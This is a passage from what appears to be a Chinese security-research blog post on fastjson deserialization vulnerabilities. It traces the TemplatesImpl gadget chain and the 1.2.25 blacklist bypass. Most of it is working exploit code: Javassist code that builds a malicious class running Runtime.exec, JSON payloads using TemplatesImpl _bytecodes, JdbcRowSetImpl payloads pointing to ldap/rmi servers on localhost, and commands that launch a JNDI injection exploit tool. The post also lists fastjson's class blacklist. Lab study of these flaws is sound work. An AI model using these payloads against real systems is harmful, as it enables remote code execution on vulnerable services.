<h4 id="①问题1：为什么要继承AbstractTranslet类？"><a href="#①问题1：为什么要继承AbstractTranslet类？" class="headerlink" title="①问题1：为什么要继承AbstractTranslet类？"></a>①问题1：为什么要继承<code>AbstractTranslet</code>类？</h4><p>参考<code>Y4tacker</code>师傅的文章：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/119082164">https://blog.csdn.net/solitudi/article/details/119082164</a></p>
</blockquote>
<p>但是在实战场景中，<code>Java</code>的<code>ClassLoader</code>类提供了<code>defineClass()</code>方法，可以把字节数组转换成<code>Java</code>类的示例，但是这里面的方法的作用域是被<code>Protected</code>修饰的，也就是说这个方法只能在<code>ClassLoader</code>类中访问，不能被其他包中的类访问：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680590757100-eb95f1f7-40f6-4d0e-9709-e05ec7fd2f05.png#averageHue=%23f7f6ee&clientId=u8272b843-0f56-4&from=paste&height=501&id=u7f65687c&name=image.png&originHeight=626&originWidth=1663&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129161&status=done&style=none&taskId=ucc0eb086-134e-4e75-971f-1440c66f5e8&title=&width=1330.4" alt="image.png"><br>但是，在<code>TransletClassLoader</code>类中，<code>defineClass</code>调用了<code>ClassLoader</code>里面的<code>defineClass</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680590943310-12009aa2-effc-4ba3-9ea3-3d9e71b1e27b.png#averageHue=%23f9f7ee&clientId=u8272b843-0f56-4&from=paste&height=673&id=uf214e094&name=image.png&originHeight=841&originWidth=1627&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=177301&status=done&style=none&taskId=u739d2600-283f-43c4-a34d-3f37b5675be&title=&width=1301.6" alt="image.png"><br>然后追踪<code>TransletClassLoader</code>，发现是<code>defineTransletClasses</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680591071672-d20557c6-a17f-4e54-b067-02a5a910ba00.png#averageHue=%23f9f7ef&clientId=u8272b843-0f56-4&from=paste&height=800&id=u1b179c9a&name=image.png&originHeight=1000&originWidth=1667&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=217032&status=done&style=none&taskId=ub78e3007-2549-44d3-a28d-04ff105aadc&title=&width=1333.6" alt="image.png"><br>再往上，发现是<code>getTransletInstance</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680591219803-00065e5e-90d0-4ea9-b479-581757ad459a.png#averageHue=%23f9f7f0&clientId=u8272b843-0f56-4&from=paste&height=818&id=ucd5e69df&name=image.png&originHeight=1023&originWidth=1758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=233805&status=done&style=none&taskId=uad2e9d73-4970-4c88-9954-2c18b173cd0&title=&width=1406.4" alt="image.png"><br>到此为止，要么是<code>Private</code>修饰要么就是<code>Protected</code>修饰，再往上继续追踪，发现是<code>newTransformer</code>，可以看到此时已经是<code>public</code>了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680591302146-a7b5b704-09d7-415a-9ca3-758299c2ff8f.png#averageHue=%23f9f7f1&clientId=u8272b843-0f56-4&from=paste&height=818&id=ud66221b0&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=227283&status=done&style=none&taskId=u192efad0-965c-407e-847d-e6e933611b0&title=&width=1536" alt="image.png"><br>因此，我们的利用链是：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses() -&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
<p>基于此，我们可以写出如下<code>POC</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(test.class.getName());</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;W01fh4cker&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] evilCode = cc.toBytecode();</span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(evilCode);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<span class="string">&quot;\&quot;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode_base64+<span class="string">&quot;\&quot;],&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_name&#x27;:&#x27;W01h4cker&#x27;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_tfactory&#x27;:&#123; &#125;,&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#x27;_outputProperties&#x27;:&#123; &#125;&quot;</span>+</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码就可以动态生成恶意类，执行效果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680592080496-8eff1e08-d95e-4b92-8b44-2579a56b705b.png#averageHue=%23f7f5f2&clientId=u8272b843-0f56-4&from=paste&height=818&id=u0860b899&name=image.png&originHeight=1022&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=270888&status=done&style=none&taskId=u7149eba7-8b8d-4b15-9b99-aa6aca29b2c&title=&width=1536" alt="image.png"></p>
<h4 id="②为什么要这么构造json？"><a href="#②为什么要这么构造json？" class="headerlink" title="②为什么要这么构造json？"></a>②为什么要这么构造<code>json</code>？</h4><p>可以看到，我们最终构造的json数据为：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;yv66vgAAADQA...CJAAk=&quot;</span>],</span><br><span class="line">	<span class="string">&quot;_name&quot;</span>: <span class="string">&quot;W01fh4cker&quot;</span>,</span><br><span class="line">	<span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line">	<span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为什么这么构造呢？还是直接看<code>defineTransletClasses</code>这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680594202033-dc9f3a2c-1ced-4c47-9502-65b1dbf11ccc.png#averageHue=%23f9f6f5&clientId=u8272b843-0f56-4&from=paste&height=818&id=ub4654356&name=image.png&originHeight=1023&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=204152&status=done&style=none&taskId=ua3d301b2-2ec5-4f36-ab5a-5e3e178f6d8&title=&width=1534.4" alt="image.png"><br>可以看到，逻辑是这样的：先判断<code>_bytecodes</code>是否为空，如果不为空，则执行后续的代码；后续的代码中，会调用到自定义的<code>ClassLoader</code>去加载<code>_bytecodes</code>中的<code>byte[]</code>，并对类的父类进行判断，如果是<code>ABSTRACT_TRANSLET</code>也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，那么就把类成员属性的<code>_transletIndex</code>设置成当前循环中的标记位，第一次调用的话，就是<code>class[0]</code>。<br>可以看到，这里的<code>_bytecodes</code>和<code>_outputProperties</code>都是类成员变量。同时，<code>_outputProperties</code>有自己的<code>getter</code>方法，也就是<code>getOutputProperties</code>。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680594021516-01ba0d37-4b23-4fec-965c-2b1bc267f9a6.png#averageHue=%23fbf7f6&clientId=u8272b843-0f56-4&from=paste&height=694&id=u6e694cd4&name=image.png&originHeight=868&originWidth=857&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79396&status=done&style=none&taskId=u140ff6c7-e7d4-4dfd-90b3-87f1b763daf&title=&width=685.6" alt="image.png"><br><strong>总结：说详细一点，</strong><code>**TemplatesImpl**</code><strong>利用链的整体思路如下：</strong><br><strong>构造一个</strong><code>**TemplatesImpl**</code><strong>类的反序列化字符串，其中</strong><code>**_bytecodes**</code><strong>是我们构造的恶意类的类字节码，这个类的父类是</strong><code>**AbstractTranslet**</code><strong>，最终这个类会被加载并使用</strong><code>**newInstance()**</code><strong>实例化。在反序列化过程中，由于</strong><code>**getter**</code><strong>方法</strong><code>**getOutputProperties()**</code><strong>满足条件，将会被</strong><code>**fastjson**</code><strong>调用，而这个方法触发了整个漏洞利用流程：</strong><code>**getOutputProperties()**</code>** -&gt; <strong><code>**newTransformer()**</code></strong> -&gt; <strong><code>**getTransletInstance()**</code></strong> -&gt; <strong><code>**defineTransletClasses()**</code></strong> &#x2F; **<code>**EvilClass.newInstance()**</code><strong>。</strong><br><strong>限制条件也很明显：需要代码中加了</strong><code>Feature.SupportNonPublicField</code>。</p>
<h2 id="2-fastjson-1-2-25-反序列化漏洞（学习JdbcRowSetImpl链的相关知识）"><a href="#2-fastjson-1-2-25-反序列化漏洞（学习JdbcRowSetImpl链的相关知识）" class="headerlink" title="2. fastjson 1.2.25 反序列化漏洞（学习JdbcRowSetImpl链的相关知识）"></a>2. fastjson 1.2.25 反序列化漏洞（学习JdbcRowSetImpl链的相关知识）</h2><h3 id="（1）黑白名单机制介绍"><a href="#（1）黑白名单机制介绍" class="headerlink" title="（1）黑白名单机制介绍"></a>（1）黑白名单机制介绍</h3><p>众所周知，在<code>fastjson</code>自爆<code>1.2.24</code>版本的反序列化漏洞后，<code>1.2.25</code>版本就加入了黑白名单机制。<br>例如我们更换并下载<code>1.2.25</code>版本的<code>fastjson</code>，然后再去执行原来的<code>poc</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680602428789-1bd4d27c-554f-4f7d-ba10-70335c95979c.png#averageHue=%23f8f6ee&clientId=u8272b843-0f56-4&from=paste&height=685&id=u6a605695&name=image.png&originHeight=856&originWidth=1137&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=126619&status=done&style=none&taskId=ue1acbefb-caac-4575-bda5-3046c4afec8&title=&width=909.6" alt="image.png"><br>就会提示我们<code>autoType is not support</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680602460437-b6fdf70e-144d-4fbf-a81a-0cdc6586e965.png#averageHue=%23f8f5f3&clientId=u8272b843-0f56-4&from=paste&height=815&id=uca9dbb44&name=image.png&originHeight=1019&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=286568&status=done&style=none&taskId=u1332263e-921c-4bf2-83fe-190f3bc94df&title=&width=1536" alt="image.png"><br>查看源码可以发现这里定义了反序列化类的黑名单：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680604869097-81a97752-c1dd-4296-950f-0fd01d4930fc.png#averageHue=%23f9f7f5&clientId=u8272b843-0f56-4&from=paste&height=816&id=ueb7677c7&name=image.png&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=231734&status=done&style=none&taskId=ue12fd80e-38a9-418e-8256-aefa689e6e5&title=&width=1536" alt="image.png"><br>具体如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>
<p>接下来我们定位到<code>checkAutoType()</code>方法，看一下它的逻辑：如果开启了<code>autoType</code>，那么就先判断类名在不在白名单中，如果在就用<code>TypeUtils.loadClass</code>加载，如果不在就去匹配黑名单：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680605036525-87782994-bf9a-402e-b296-12fc30a4fbfb.png#averageHue=%23f9f6f4&clientId=u8272b843-0f56-4&from=paste&height=819&id=u21ab298d&name=image.png&originHeight=1024&originWidth=1629&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193217&status=done&style=none&taskId=u1dcddc72-8c1a-4022-a3ca-963d93ef79f&title=&width=1303.2" alt="image.png"><br>如果没开启<code>autoType</code>，则先匹配黑名单，然后再白名单匹配和加载；<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680611575004-0fd9b05b-be51-4d38-98c8-b4275ffb8d24.png#averageHue=%23faf7f5&clientId=u8272b843-0f56-4&from=paste&height=817&id=ud6928fab&name=image.png&originHeight=1021&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=208537&status=done&style=none&taskId=u427e137d-c780-4bfd-8c2d-127e1e67626&title=&width=1536" alt="image.png"><br>最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了<code>autoType</code>或者<code>expectClass</code>不为空也就是指定了<code>Class</code>对象时才会调用<code>TypeUtils.loadClass</code>加载，否则<code>fastjson</code>会默认禁止加载该类。<br>我们跟进一下这里的<code>loadClass</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680612305580-814698ec-124a-4163-ae33-7095c8652d77.png#averageHue=%23fbf9f7&clientId=u8272b843-0f56-4&from=paste&height=630&id=ucd579f2f&name=image.png&originHeight=787&originWidth=1309&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134082&status=done&style=none&taskId=u3db5682b-8f05-4cd7-b3e3-c39a95a5231&title=&width=1047.2" alt="image.png"><br>问题就出在这里：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680612341139-7fe94d48-277e-42c7-a3db-fc3800c6a3d3.png#averageHue=%23faf7f5&clientId=u8272b843-0f56-4&from=paste&height=726&id=u046e0f4e&name=image.png&originHeight=907&originWidth=1915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=216516&status=done&style=none&taskId=u255b3b53-4577-4571-9eae-fc3a74890ba&title=&width=1532" alt="image.png"><br>我们来仔细看下上图红框中的代码，代码的含义是：如果类名的字符串以<code>[</code>开头，则说明该类是一个数组类型，需要递归调用<code>loadClass</code>方法来加载数组元素类型对应的<code>Class</code>对象，然后使用<code>Array.newIntrance</code>方法来创建一个空数组对象，最后返回该数组对象的<code>Class</code>对象；如果类名的字符串以<code>L</code>开头并以<code>;</code>结尾，则说明该类是一个普通的<code>Java</code>类，需要把开头的<code>L</code>和结尾的<code>;</code>给去掉，然后递归调用<code>loadClass</code>。</p>
<h3 id="（2）黑白名单绕过的复现"><a href="#（2）黑白名单绕过的复现" class="headerlink" title="（2）黑白名单绕过的复现"></a>（2）黑白名单绕过的复现</h3><p>基于以上的分析，我们可以发现，只要我们把<code>payload</code>简单改一下就可以绕过。<br>我们需要先开启默认禁用的<code>autoType</code>，有以下三种方式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;org.example.,org.javaweb.&quot;</span>);或者ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">加上JVM启动参数：-Dfastjson.parser.autoTypeAccept=org.example.</span><br><span class="line">在fastjson.properties中添加：fastjson.parser.autoTypeAccept=org.example.</span><br></pre></td></tr></table></figure>
<p>我们先去<code>[https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)</code>下载个<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，然后启动利用工具：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -A <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -C <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
<p>选择下面的<code>JDK 1.8</code>的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680617239373-2a161464-b3a1-4d3f-8f8f-b4dc523ffe2a.png#averageHue=%231a1717&clientId=u8272b843-0f56-4&from=paste&height=268&id=u7e19c58f&name=image.png&originHeight=335&originWidth=1479&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=51934&status=done&style=none&taskId=u05bf2652-312e-4b63-b411-b1aa678099a&title=&width=1183.2" alt="image.png"><br>然后在<code>Main.py</code>中写入如下代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ppcjug\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25360791/1680614580975-c77c8c3e-f26e-44bc-b944-bdb28504da0f.png#averageHue=%23f7f6f5&clientId=u8272b843-0f56-4&from=paste&height=818&id=u4433d1f9&name=image.png&originHeight=1023&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=242676&status=done&style=none&taskId=u5559770c-6f78-4d2b-8f00-46a2a5cfea4&title=&width=1536" alt="image.png"><br>以上为第一种<code>poc</code>，在<code>JDK 8u181</code>下使用<code>ldap</code>测试成功，使用<code>rmi</code>测试失败。<br>除此之外，另一种<code>poc</code>则需要满足漏洞利用条件为<code>JDK 6u113</code>、<code>7u97</code> 和 <code>8u77</code>之前，例如我们这里重新新建一个项目，并从<code>[https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html)</code>处下载<code>jdk-8u65-windows-x64.exe</code>并安装。<br>然后利用新安装的<code>jdk 8u65</code>来启动<code>jndi exploit</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;C:\Program Files\Java\jdk1.8.0_65\bin\java.exe&quot;</span> -jar .\JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -A <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -C <span class="string">&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>
<p>导入<code>fastjson1.2.25</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;project xmlns=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><span class="line">    &lt;modelVersion&gt;<span class="number">4.0</span><span class="number">.0</span>&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson_8u66_1_2_25&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.0</span>-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;<span class="number">8</span>&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;<span class="number">8</span>&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-<span class="number">8</span>&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.25</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
<p>在<code>Main.java</code>中写入如下内容：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// ldap 和 rmi都可以</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ift2ty\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSONObject.parse(payload);</span><br><span class="line">    &#125;</span><br><span 